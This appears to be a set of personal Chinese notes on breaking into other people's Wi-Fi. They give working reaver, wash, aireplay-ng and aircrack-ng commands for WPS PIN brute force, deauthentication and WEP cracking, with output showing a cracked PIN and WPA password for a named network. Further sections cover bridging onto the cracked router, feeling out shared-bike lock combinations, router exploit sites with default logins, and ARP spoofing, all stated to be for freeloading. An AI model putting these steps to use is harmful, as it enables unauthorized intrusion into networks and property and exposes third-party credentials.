WPS的目的是简化用户输入密码的步骤；
在某个设备连接wifi，需要输入密码时，只要按一下无线路由器上的wps按钮就可以了。

Reaver是除字典破解之外的另一个选择：
如果无线路由器开启了WPS，就不必使用上面的字典破解方法了。


WPS的pin码并没有加密。Reaver会暴力破解pin码，找到pin码也就找到了密码。一般用时也不短。


注意：

网卡支持数据包注入，一般笔记本不支持
要求无线信号强
如果发送pin码过快，有可能造成路由器崩溃；就类似对服务器的DDOS攻击。
Reaver有很多选项，我只使用最基本的选项，你也许需要根据情况使用其他选项。查看帮助：reaver ?


🔵 开启监控模式   airmon-ng start wlan0
🔵 查看 wifi     airodump-ng wlan0mon
🔵 wps wifi      wash -i wlan0mon -C

BSSID                  Channel       RSSI       WPS Version       WPS Locked        ESSID
---------------------------------------------------------------------------------------------------------------
F0:B4:29:DA:BB:84       8            00        1.0               No                (null)
A8:57:4E:D1:ED:6A      11            00        1.0               No                T2-20B
50:BD:5F:4C:44:C7       3            00        1.0               No         Birdhouse 2.4G

如果什么也没有表示周围没有开启WPS的无线路由器。记住要破解wifi的BSSID。
wps locked 下是no  ➜  wps 没有被关闭.  也就是说开启的...


开始破解
reaver -i wlan0mon -b E4:D3:32:B4:83:BC -vv -a



等... 2-10个小时...






隐藏ssid.
普通方法显示wifi的时候 wifi名字是 length xx 的 没有ap名. 但是bssid 还是有的.
查看ssid 方法:
# airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon
# aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon
破解密码的方法不变；使用上面两个命令就可以轻松得到ap名。
事实证明，隐藏SSID并不管啥事；其实设置一个复杂的密码比隐藏SSID要管用的多。







二、破解原理
系统原理：
利用PIN码破密：
1、不需要客户端，
2、有PIN码就能获得无线密码，
3、八位数PIN码实际只有一万一千组随机密码，
4、抓包、EWSA跑包，每个环节都有很大的不确定性。
而PIN破密，只要开户WPS，破密只是个时间问题。可以说破解几率是100%的......
PIN 码PJ 简单扫盲：
PIN 码分前4 和后4，
先破前4 只有最多一万个组合，
破后4 中的前3 只有一千个组合，一共就是一万一千个密码组合。 10 的4 次方+10 的3 次方=11000 个密码组合。

当reaver 确定前4 位PIN 密码后，其任务进度数值将直接跳跃至90.9%以上，也就是
说只剩余一千个密码组合了。总共一万一千个密码!
路由开启了WPS的WPA、WPA2信号70%没问题，而且要求接收到的信号较好，
信号差的速度很慢，而且成功了也不一定能上网，
没有开启WPS的不能搞，你可以用此软件扫描出哪些信号开启了WPS。据调查，70%的信号开启了WPS。

成功的时间长短取决于PIN码的大小、信号的强度和电脑的性能，
有的二三个小时，有的十多个小时或更长，
大家要有心理准备，用虚拟机和U盘启动的朋友都要学会保存进度，
一次没搞定，可以下次接着搞。



尝试了60次就达到路由器上限了. 会自动停止几秒.再自动破解. 反正等就是了..


[+] Sending M2 message
[P] E-Hash1: 59:24:ff:26:5d:e6:7f:54:d5:ef:aa:fa:5b:15:25:8e:5b:d1:3e:3d:db:bf:69:92:a6:ef:20:ad:23:ad:10:d9
[P] E-Hash2: 9d:be:01:06:88:40:4d:ef:61:7d:6e:0d:e7:12:bc:6f:88:fd:b6:34:d2:9d:67:22:0b:b4:72:9d:dd:87:aa:e0
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 31654 seconds
[+] WPS PIN: '31070003'
[+] WPA PSK: 'njs236121'
[+] AP SSID: 'MERCURY_210'


下面来桥接.   信号不好..

⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--无线中继---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
🔵 WDS
  必须两台路由器都具有 WDS功能 才能实现中继.
  另外，目前WDS还非国际标准，跨品牌产品之间的无线中继，不能保证一定成功....

🔵 加密方式
　　无线局域网应用的日益普及，安全加密尤为必要。但使用WDS时，加密的选择有一定的局限性。
　　❗❗️❗️️ 使用NETGEAR无线路由器进行无线中继时，仅支持WEP加密❗️❗️❗️
　　❗❗️❗️️ 使用NETGEAR无线路由器进行无线中继时，仅支持WEP加密❗️❗️❗️
　　❗❗️❗️️ 使用NETGEAR无线路由器进行无线中继时，仅支持WEP加密❗️❗️❗️

　　❗️❗️❗️ 无线中继的两个设备，必须选择相同的加密方式、和密码️❗️❗️❗️
　　❗️❗️❗️ 无线中继的两个设备，必须选择相同的加密方式、和密码️❗️❗️❗️
　　❗️❗️❗️ 无线中继的两个设备，必须选择相同的加密方式、和密码️❗️❗️❗️

    👁‍🗨 也就是说. 对方路由器是wap2-psk 加密的. 
    如果你想用网件的路由器来做中继. 那么只能改对方路由器的加密方式.
    但是 我们这里是蹭网的. 改人家密码不合适.... 算了...


🔵 信道
    必须首先将对方频道/信道改为固定的数值，推荐使用1、6或11。 不要使用自动!!!

🔵 SSID 
  SSID可以相同，也可以不同。
  如果希望无线客户端在两个无线路由器的范围内实现漫游，请将SSID设为相同
  一般没必要. 肯定是信号不好才要中继的.

🔵 对方路由器开启中继 水星路由器

 开启 wds功能 ➜ 扫描 ➜  选择你的路由器 ➜  密钥那里 填你的路由器的wifi密码


🔵 自己路由器开启中继 网件路由器

  🔸 加密模式  必须选择.. wep  密码长度是 10位数以上如:  1234567899

  🔸 开启wds
    点击左侧菜单中的高级->无线中继功能，设置中继：
　　在“启用无线中继功能”前打钩；
　　选择“无线中继器”模式，在“基站MAC地址”中，填入路由器A的MAC地址；






















ofo 开锁.


第一步：按紧锁头(开锁的按钮)

第二步：闭下眼睛，慢慢转动“千位转轮”(四位密码锁一共有4组密码，第一位数字称为千位)，找出最松动的位置。

第三步：同样的道理，也由此找出其它三位数。

那什么是“找出最松动的位置”呢?

因为各个单个密码位的转轮看似旋转时转到每个数字时的转速相同，但是实则不然。如果千位数字，密码数字是“8”，那么你会发现“8”周围的数字包括“8”，转轮转到时，会很松动，这就需要破解密码者耐心寻找了。

但是这种方法只能破解大多数的车，因为如果密码锁润滑油充足，转轮的松动是很难被察觉的。



wep 破解.


只要获得足够的 beacons 和 data 数据就可以破解.
理想情况下是100000+。你可以等，也可以使用aireplay加快这个进程。

# aireplay-ng -1 0 -a C8:3A:35:30:3E:C8 wlan0mon
# aireplay-ng -3 -b C8:3A:35:30:3E:C8 wlan0mon
等到抓取的数据充足，Ctrl+C停止。

6) 开始破解：
# aircrack-ng ~/*.cap

最后，不要忘了结束无线网卡的监控模式：
# airmon-ng stop wlan0mon





🔵 beacons

beacon 是一种帧.
有一个频率 默认是100ms 一次.

就像菜市场卖菜 大妈叫卖 白菜白菜便宜啦

 这个叫卖的频率很有讲究 叫太快了整个市场都听你叫唤 别人没法做生意了 叫太慢又没人知道你卖白菜

beacon设置频率太高 占用信道传输正常数据 频率太低 新连进来的设备就要很久才能显示出来这个wifi热点






## wifi 渗透



路由器 wps 功能:
WPS用于简化Wi-Fi无线的安全设置和网络管理。

它支持两种模式：
个人识别码(PIN)模式和按钮(PBC)模式。
路由器在出产时默认都开启了wps但这真的安全么！

个人码(PIN)
有人可能会问了什么是pin码？
WPS技术会随机产生一个八位数字的字符串作为个人识别号码（PIN）
Pin码会分成前半四码和后半四码。前四码如果错误的话，那路由器就会直接送出错误讯息，而不会继续看后四码，意味着试到正确的前四码，最多只需要试 10000 组号码。一旦没有错误讯息，就表示前四码是正确的，而我们便可以开始尝试后四码。 后四码比前四码还要简单，因为八码中的最后一码是检查码，由前面七个数字产生，因此实际上要试的只有三个数字，共一千个组合。这使得原本最高应该可达一千万组的密码组合（七位数+检查码），瞬间缩减到仅剩 11,000 组，大幅降低破解所需的时间.

根据路由MAC地址算出默认pin码
另外有种更快破解wifi的方法就是根据路由MAC地址（MAC是路由器的物理地址，是唯一的识别标志）算出默认出产时的pin码例如以下软件 还可以通过别人共享的找到pin码！http://mac-pin.456vv.net/



# 八: 无线渗透

到处是无线信号. 不知道密码怎么办呢! 
Kali 有很多工具可以破解 无线网络.

要进行无线渗透. 必须先扫描所有的无线接入点.

## Kismet/KisMAC 无线网络嗅探破解
Linux: Kismet   (不支持MAC OS)
MAC OS:  KisMAC  

KisMAC 支持多种 第三方USB卡.

只能破解WEP.  不能破解WEP2.

设置下网卡. 右上角 scan


**破解要选择信号强度高的,加密模式是 WEP的.**
现在几乎见不到 wep加密的了.... 算了吧..






## WAP / WAP2 破解







## WPS
路由器按下按钮/或者输入很短的一个 pin码  手机就可以上网了.
大部分路由器都支持 WPS功能. 
以前是WPS设置里设置. 现在是QSS 里设置

Fern Wifi Cracker 来攻击WPS.





## 路由器攻击

[https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/57.html]
???


不懂要先连上网络呢...
连上了 还要密码干嘛....




路由器本身就有一些漏洞.
绝对密码太烦的话 可以考虑路由器

Routerpwn 只是一个网站 但是可以直接查看路由器漏洞.

[http://routerpwn.com/]

这个网站 列出很多的路由器厂家.比如国内最常见的  tplink 

左边是漏洞种类. 右边是 该漏洞涉及的型号

网页漏洞 右边 有个设置IP的. 填上路由器的IP地址.
然后 跳出登录界面. 一般都是 admin admin








## arpspoof
Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗。


用 arp 攻击网关..











## wifi 渗透


路由器 wps 功能:
WPS用于简化Wi-Fi无线的安全设置和网络管理。

它支持两种模式：
个人识别码(PIN)模式和按钮(PBC)模式。
路由器在出产时默认都开启了wps但这真的安全么！

个人码(PIN)
有人可能会问了什么是pin码？
WPS技术会随机产生一个八位数字的字符串作为个人识别号码（PIN）
Pin码会分成前半四码和后半四码。前四码如果错误的话，那路由器就会直接送出错误讯息，而不会继续看后四码，意味着试到正确的前四码，最多只需要试 10000 组号码。一旦没有错误讯息，就表示前四码是正确的，而我们便可以开始尝试后四码。 后四码比前四码还要简单，因为八码中的最后一码是检查码，由前面七个数字产生，因此实际上要试的只有三个数字，共一千个组合。这使得原本最高应该可达一千万组的密码组合（七位数+检查码），瞬间缩减到仅剩 11,000 组，大幅降低破解所需的时间.

根据路由MAC地址算出默认pin码
另外有种更快破解wifi的方法就是根据路由MAC地址（MAC是路由器的物理地址，是唯一的识别标志）算出默认出产时的pin码例如以下软件 还可以通过别人共享的找到pin码！http://mac-pin.456vv.net/












⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
wps 实战2 .  

🔵  ChinaNet-VTka

    查看开启 wps wifi        wash -i wlan0mon -C

    18:44:E6:73:CA:CF       2            00        1.0               No                ChinaNet-VTka

    reaver -i wlan0mon -b 18:44:E6:73:CA:CF -vv -a

    [!] WARNING: Receive timeout occurred
    [+] Sending EAPOL START request
    [!] WARNING: Receive timeout occurred
    [+] Sending EAPOL START request
    [!] WARNING: Receive timeout occurred
    [+] Sending EAPOL START request

    对方有保护机制...  放弃...








不能上谷歌... 


fuck ... 百度都上不去... 延迟4秒....  丢包.....




